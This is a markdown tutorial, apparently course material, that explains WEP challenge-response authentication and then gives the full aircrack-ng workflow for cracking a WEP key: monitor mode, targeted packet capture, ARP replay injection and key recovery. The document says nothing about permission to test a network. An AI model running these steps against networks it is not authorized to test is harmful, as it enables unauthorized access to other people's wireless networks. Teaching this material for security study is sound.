# Crack WEP Password
## How WEP works
Generally WEP encryption works between wireless AP and wireless station (host). First of all, the **host** and the **AP** share their secret key which we commonly call as passphrase.

 1. The **host** sends an authentication request to the **AP**. In this step no data encryption takes place

 2. The **AP** responds with an authentication response message consist of challenge text

 3. Now the client uses its secret WEP key to encrypt the challenge text and sends it to the access point

 4. If the access point successfully decrypt the encrypted challenge and retrieve the original challenge text then it comes to know that the client is also using the same secret key. So responds with an **Confirmation Success** message

 5. Finally, data transfer takes place


# Read WiFi Network Interface Data

 1. Authenticate as superuser
 2. Execute `iw` command in order to find and manipulate your wireless devices and their configuration 
```
sudo su 
iw dev
```

# Start Cracking

 * The first thing we have to do is to set our network card in *monitor mode* which allows to monitor all traffic received on a wireless channel
    * `airmon-ng start <INTERFACE_NAME>`
 * Check again your network wireless card name using `iw dev` command
     * `iw dev`

 * Let's now start `airodump-ng` in order to obtain some useful information about `AP Name`, `Channel` and `BSSID`
    * `airodump-ng <INTERFACE_NAME_MONITOR_MODE>`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WEP/3.%20airodump-ng.png?raw=true)
 * We can now start capturing some data using (again) `airodump-ng` command
 * `airodump-ng -c <NUM_CHANNEL> --bssid <AP_MAC_ADDRESS> -w <OUTPUT_FILE_CAPTURE> <INTERFACE_NAME_MONITOR_MODE>`

## Start cracking the network password

 * If we need to receive more traffic, we can use `aireplay-ng` command which allows us to send `ARP` requests from hosts to th AP. This utility will trigger traffic through AP giving us the right amount of **Initialization Vector (IV)** in order to retrieve the password.
    * `aireplay-ng -3 <INTERFACE_NAME_MONITOR_MODE> -b <AP_MAC_ADDRESS>`
 * Meanwhile, in another terminal, we can run `aircrack-ng` (as superuser) in order to decrypt the network password
    * `aircrack-ng <OUTPUT_FILE_CAPTURE> `

## Stop Monitor Mode

Remember to disable the **monitor mode** from your wireless network card
 * `airmon-ng stop <INTERFACE_NAME>`
